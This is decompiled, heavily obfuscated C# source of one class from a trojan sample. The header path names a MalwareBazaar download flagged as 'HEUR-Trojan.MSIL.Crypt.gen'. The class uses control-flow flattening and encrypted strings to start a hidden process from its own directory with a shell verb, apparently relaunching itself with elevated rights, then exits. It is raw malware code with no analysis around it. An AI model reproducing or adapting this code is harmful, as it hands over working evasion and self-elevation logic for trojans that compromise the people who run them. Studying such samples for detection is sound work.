// Decompiled with JetBrains decompiler
// Type: @ӯ
// Assembly: uLqhNaw2rJQahaaHEibmS0F8CAhQ12f0pD0UHJWVCL, Version=9.1.2.0, Culture=neutral, PublicKeyToken=null
// MVID: D212B58E-19EB-4690-837D-62FC76EFC9D2
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Crypt.gen-c92d5d3e7959656b93039f2d0479f1cd50ca98907ea5aa0a925724b1dca475a3.exe

using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.CompilerServices;

internal sealed class \u0040ӯ : \u0040Ӡ
{
  private readonly object \u0040ӓ;
  private readonly int \u0040Ӕ;

  [SpecialName]
  [MethodImpl(MethodImplOptions.NoInlining)]
  public string \u00323M() => (string) this.\u0040ӓ;

  [SpecialName]
  [MethodImpl(MethodImplOptions.NoInlining)]
  public int M37() => this.\u0040Ӕ;

  [MethodImpl(MethodImplOptions.NoInlining)]
  public \u0040ӯ(string _param1, string _param2, \u0040Ԫ _param3)
  {
    int num1;
    if (!\u0040ӯ.\u0040ӧ())
      num1 = 2;
    else
      goto label_7;
label_4:
    while (true)
    {
      switch (num1)
      {
        case 0:
        case 2:
          goto label_6;
        case 1:
        case 3:
          goto label_3;
        case 4:
          goto label_8;
        default:
          num1 = 4;
          continue;
      }
    }
label_3:
    \u0040ӯ.\u0040Ӗ((object) this);
    goto label_8;
label_6:
    \u0040ӯ.\u0040ӕ();
    goto label_3;
label_7:
    num1 = 3;
    if (true)
      goto label_4;
label_8:
    try
    {
      bool flag1 = \u0040ԝ.\u0040؜();
      int num2;
      if (\u0040ӯ.\u0040Ӧ())
      {
        num2 = 5;
        goto label_21;
      }
      else
      {
        num2 = 1;
        if (true)
          goto label_21;
      }
label_13:
      \u0040ԝ.\u0040ք(_param1, (string) \u0040ӯ.\u0040Ӛ(1898), _param3);
      if (false)
        return;
      num2 = 7;
label_21:
      Process process;
      bool flag2;
      while (true)
      {
        switch (num2)
        {
          case 0:
          case 5:
            if (flag1)
            {
              if (\u0040ӯ.\u0040Ӧ())
              {
                num2 = 10;
                continue;
              }
              goto case 8;
            }
            else
            {
              ProcessStartInfo processStartInfo = new ProcessStartInfo();
              \u0040ӯ.\u0040ӗ((object) processStartInfo, ProcessWindowStyle.Hidden);
              \u0040ӯ.\u0040Ә((object) processStartInfo, true);
              \u0040ӯ.\u0040Ӝ((object) processStartInfo, \u0040ӯ.\u0040ӛ(\u0040ӯ.\u0040ә(\u0040ԑ.\u0040ӓ), \u0040ӯ.\u0040Ӛ(1604)));
              \u0040ӯ.\u0040Ӟ((object) processStartInfo, \u0040ӯ.\u0040ӛ(\u0040ӯ.\u0040ӝ(\u0040ӯ.\u0040Ӛ(2574)), \u0040ӯ.\u0040Ӛ(2602)));
              \u0040ӯ.\u0040Ӡ((object) processStartInfo, \u0040ӯ.\u0040ӟ(\u0040ӯ.\u0040Ӛ(2640), \u0040ԑ.\u0040ӓ, \u0040ӯ.\u0040Ӛ(2670)));
              \u0040ӯ.\u0040ӡ((object) processStartInfo, \u0040ӯ.\u0040Ӛ(1884));
              process = (Process) \u0040ӯ.\u0040Ӣ((object) processStartInfo);
              num2 = 8;
              continue;
            }
          case 1:
            goto label_24;
          case 2:
            goto label_15;
          case 3:
            if (!flag2)
            {
              this.\u0040Ӕ = 1;
              num2 = 11;
              continue;
            }
            goto case 4;
          case 4:
            \u0040ԝ.\u0040ֆ();
            num2 = 9;
            continue;
          case 6:
            goto label_1;
          case 7:
            \u0040ӯ.\u0040Ӥ(0);
            num2 = 6;
            continue;
          case 8:
            flag2 = \u0040ӯ.\u0040ӣ((object) process) >= 2;
            num2 = 3;
            continue;
          case 9:
            goto label_13;
          case 10:
            goto label_11;
          case 11:
            goto label_27;
          default:
            if (\u0040ӯ.\u0040Ӧ())
            {
              num2 = 4;
              continue;
            }
            goto case 4;
        }
      }
label_11:
      this.\u0040Ӕ = 0;
      return;
label_24:
      return;
label_15:
      return;
label_1:
      return;
label_27:;
    }
    catch (Exception ex)
    {
      this.\u0040ӓ = \u0040ӯ.\u0040ӥ((object) ex);
      this.\u0040Ӕ = 1;
    }
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static void \u0040ӕ() => \u0040ո.\u0040Ӕ();

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static void \u0040Ӗ(object _param0) => _param0.\u002Ector();

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static void \u0040ӗ(object _param0, ProcessWindowStyle _param1) => ((ProcessStartInfo) _param0).WindowStyle = _param1;

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static void \u0040Ә(object _param0, bool _param1) => ((ProcessStartInfo) _param0).UseShellExecute = _param1;

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static object \u0040ә(object _param0) => (object) Path.GetDirectoryName((string) _param0);

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static object \u0040Ӛ(int _param0) => (object) \u0040շ.\u0040ӻ(_param0);

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static object \u0040ӛ(object _param0, object _param1) => (object) ((string) _param0 + (string) _param1);

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static void \u0040Ӝ(object _param0, object _param1) => ((ProcessStartInfo) _param0).WorkingDirectory = (string) _param1;

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static object \u0040ӝ(object _param0) => (object) Environment.ExpandEnvironmentVariables((string) _param0);

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static void \u0040Ӟ(object _param0, object _param1) => ((ProcessStartInfo) _param0).FileName = (string) _param1;

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static object \u0040ӟ(object _param0, object _param1, object _param2) => (object) ((string) _param0 + (string) _param1 + (string) _param2);

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static void \u0040Ӡ(object _param0, object _param1) => ((ProcessStartInfo) _param0).Arguments = (string) _param1;

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static void \u0040ӡ(object _param0, object _param1) => ((ProcessStartInfo) _param0).Verb = (string) _param1;

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static object \u0040Ӣ(object _param0) => (object) Process.Start((ProcessStartInfo) _param0);

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static int \u0040ӣ(object _param0) => ((Process) _param0).Id;

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static void \u0040Ӥ(int _param0) => Environment.Exit(_param0);

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static object \u0040ӥ(object _param0) => (object) ((Exception) _param0).Message;

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static bool \u0040Ӧ() => true;

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static bool \u0040ӧ() => false;
}
